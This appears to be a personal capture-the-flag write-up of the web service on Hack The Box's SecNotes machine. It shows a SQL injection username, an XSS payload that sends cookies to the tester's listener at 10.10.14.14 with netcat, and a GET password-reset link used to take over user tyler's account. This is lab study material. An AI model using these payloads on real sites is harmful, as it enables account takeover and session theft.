# Port 80
---
![[Pasted image 20250413163947.png]]
- Tried common credentials, but didn't work
- Registered with following creds:
	- `anshul : anshul`
- **Contact Us Page**:
	- Possible user: `tyler : tyler@secnotes.htb`
	- ![[Pasted image 20250413164214.png]]
- Since this message is sent to `tyler`, **we can try to grab tyler's admin cookie using XSS**

- ==**Note: We also had SQL Injection in Register.**==
	- Make user with name `' OR 1=1 -- -` and login with same username to see all the data.
# XSS
---
- On create notes, page, **tried simple HTML injection to verify XSS** and worked:
	- ![[Pasted image 20250413164435.png]]
- Grabbing the cookie:
	- Send this message
		- `<script>window.location="http://10.10.14.14:9002/?cookie=" + document.cookie</script>`
	- Listen on 9002 port:
		- `nc -lnvp 9002`
	 ![[Pasted image 20250413164628.png]]
- This does not work, there is no connection received from tyler.


# Sending Reset Password link to `tyler`
---
- We can send `Reset Password`request with both **POST and GET methods** . **Password resets for both the cases.**
- ==This app **does not even ask for current password**, **which should ring a bell.**==
	- ![[Pasted image 20250414135751.png]]
	- ![[Pasted image 20250414135824.png]]
	- Let's see if `tyler`clicks on links
		- In message: `http:/10.10.14.19:9002`
		- ![[Pasted image 20250414140001.png]]
		- But this is some weird powershell browser, meaning **XSS cookie steal probably won't work here.**
	- Send the **password reset link as it even works for GET requests**
		- Copy the `GET` request from burp after `Right Click on POST request -> Change Request type`
	- `http://10.10.10.97/change_pass.php?password=tyler123&confirm_password=tyler123&submit=submit`![[Pasted image 20250414140321.png]]
	- Now try logging in as `tyler : tyler123`
	- ![[Pasted image 20250414140425.png]]